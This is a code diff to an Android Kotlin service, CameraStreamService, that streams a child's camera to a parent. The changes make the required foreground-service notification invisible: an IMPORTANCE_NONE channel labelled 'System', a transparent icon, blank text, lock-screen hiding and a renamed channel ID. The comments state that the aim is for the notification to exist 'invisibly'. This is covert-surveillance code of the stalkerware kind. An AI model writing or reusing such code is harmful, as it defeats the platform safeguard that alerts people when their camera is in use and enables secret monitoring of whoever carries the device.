@@ -13,12 +13,13 @@ import android.util.Log
 
 /**
  * Background foreground service that streams the kid's camera to the parent.
- * Notification uses IMPORTANCE_MIN (lowest safe level for foreground services):
- * - No status bar icon
+ * Notification uses IMPORTANCE_NONE + a fully transparent icon:
+ * - No status bar icon (transparent drawable, zero alpha)
+ * - No notification drawer entry (IMPORTANCE_NONE channel)
  * - No sound / vibration
  * - Blank title and text
  * - VISIBILITY_SECRET (hidden on lock screen)
- * The notification exists silently to keep the service alive on all Android versions.
+ * The notification exists invisibly to keep the service alive on all Android versions.
  */
 class CameraStreamService : Service() {
 
@@ -61,7 +62,7 @@ class CameraStreamService : Service() {
             val ch = NotificationChannel(
                 CHANNEL_ID,
                 "System",
-                NotificationManager.IMPORTANCE_MIN  // Lowest SAFE level — no icon, no sound
+                NotificationManager.IMPORTANCE_NONE  // Hidden: no drawer entry, no status bar icon
             ).apply {
                 setShowBadge(false)
                 setSound(null, null)
@@ -74,18 +75,18 @@ class CameraStreamService : Service() {
 
         val notif = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             Notification.Builder(this, CHANNEL_ID)
-                .setSmallIcon(android.R.drawable.ic_menu_manage)
+                .setSmallIcon(R.drawable.ic_transparent) // Transparent icon — nothing shown in status bar
                 .setContentTitle("")       // blank — nothing readable
                 .setContentText("")
                 .setVisibility(Notification.VISIBILITY_SECRET)
-                .setOngoing(true)          // non-dismissible, service stays alive
                 .build()
+                .also { it.flags = it.flags or Notification.FLAG_NO_CLEAR }
         } else {
             @Suppress("DEPRECATION")
             Notification.Builder(this)
-                .setSmallIcon(android.R.drawable.ic_menu_manage)
-                .setOngoing(true)
+                .setSmallIcon(R.drawable.ic_transparent)
                 .build()
+                .also { it.flags = it.flags or Notification.FLAG_NO_CLEAR }
         }
 
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
@@ -105,7 +106,7 @@ class CameraStreamService : Service() {
 
     companion object {
         private const val TAG        = "CameraStreamService"
-        private const val CHANNEL_ID = "cam_svc"  // New ID — forces fresh channel creation
+        private const val CHANNEL_ID = "cam_svc_v2" // Bumped — forces fresh silent channel
         private const val NOTIF_ID   = 77
 
         fun start(context: Context) {
